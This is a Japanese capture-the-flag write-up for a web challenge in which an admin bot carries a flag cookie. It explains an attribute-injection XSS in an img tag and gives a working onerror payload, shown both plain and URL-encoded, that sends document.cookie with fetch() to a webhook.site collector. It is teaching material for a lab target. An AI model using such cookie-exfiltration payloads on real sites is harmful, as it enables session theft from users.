# Animal Viewer

## / Overview

`admin bot` が持つ `animal-viewer` サイトの `cookie` 情報を外部に送信する。

## / Writeup

この問題ではDocker上で2つのWebサイトが稼働しています。

一つは `animal-viwer` ( http://animal-viewer:3000 )で、クエリストリングに動物の名前を指定すると、その動物のイラストを表示してくれるサイトです。

もう一つは `admin bot` で、こちらにフラグの情報が保存されています。 ユーザーが入力フォームに url を指定すると、`index.js` が `bot.js` の `visit` 関数を呼び出して、その url にアクセスします。


### `visit`の挙動
この `visit` 関数の中身を見てみましょう。

```js
export const visit = async (url) => {
  console.log(`start: ${url}`);


  // ブラウザの起動
  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    const page = await context.newPage();
    // Cookieをセット
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
    // urlにアクセス
    await page.goto(url, { timeout: 3_000 });
    await sleep(5_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```

* `puppeter` でブラウザを生成
* cookie をセット
* url に接続

という流れになっています。この cookie ですが、`domain: APP_HOST` が指定されています。`APP_HOST` は `animal-viewer` を指す変数であることから、フラグの情報を抽出するには url に `http://animal-viewer:3000` を指定しなければならないことが分かります。

### `animal-viewer`の`attribute injection`

次に `animal-viewer` がどの様に利用できるのか解析します。

`animal-viewer` の `index.js` を見ます。動物のイラストを表示するための処理に脆弱性がありそうです。

htmlには、あとで画像を表示するように `<img src="/[ANIMAL].png">` がセットされています。クエリストリングで動物の名前が指定されると、次のような処理で`[ANIMAL]`が置換されます。

```js
app.get("/", async (req, res) => {
    // http://animal-viewer:3000/?animal=<ここがanimalに代入される>
    const animal = req.query.animal || "alpaca";

    // animalに"<", ">"が含まれているとエラー
    if (animal.includes("<") || animal.includes(">")) {
        return res.status(400).send("Bad Request");
    }

    // htmlの[ANIMAL]をanimalで置換
    const page = html.replace("[ANIMAL]", animal);
    res.send(page);
});
```

XSSによって何かできそうですが`<`, `>`が禁止されているのでscriptタグなどは挿入できません。imgタグのXSSについて調べると次のようなサイトを発見しました。

> MDNのXSS解説サイト
>
> https://developer.mozilla.org/ja/docs/Web/Security/Attacks/XSS

imgタグのエラーハンドリングの仕組みを使うことでスクリプトを実行させることが出来そうです。(attribute injection)

具体的にはanimalの値を次の様に設定します。

```
x" onerror="alert('hi')" x=
```

これにより、imgタグは次のようになります。


```html
<img src="/x" onerror="alert('hi')" x=".png">
```

`/x`という画像は存在しないので`onerror`を呼び出します。結果、`alert('hi')`が実行され、画面にアラートが表示されます。(`x=".png"`は無視される)

実際にブラウザからChallengeサーバにアクセスして、試してみてください。意図した通りに動作するはずです。

### Cookieを外部に送信する

さて、今回の目標は`admin bot`から`animal-viewer`にアクセスした時の cookie 情報を取得することでした。

しかし `admin bot` のブラウザはヘッドレスで起動していて、直接確認する術はありません。そこでスクリプトを利用して外部に送信することを考えます。

javascript の `fetch()` を使って外部サイトにアクセス出来ます。この時、 url に cookie の情報を混ぜて送信すればフラグが得られそうです。送信先の外部サイトは [webhook](https://webhook.site/)を使用しました。ペイロードは次のようにします。

```
x" onerror="fetch('https://webhook.site/xxxx-xxxx-xxxx-xxxx-xxxx/?cookie='+document.cookie)" x="
```

これを`animal-viewer`のクエリストリングに追加して`admin bot`の入力フォームから送信します。確実に成功させるため、ペイロードはURLエンコードします。

次の url を`admin bot`の入力フォームに入力してください。

```
http://animal-viewer:3000/?animal=x%22%20onerror%3D%22fetch(%27https%3A%2F%2Fwebhook.site%2Fxxxx-xxxx-xxxx-xxxx-xxxx%2F%3Fcookie%3D%27%2Bdocument.cookie)%22%20x%3D%22
```

`webhook`の画面に戻ると、リクエストが記録されていてフラグが取得できています。
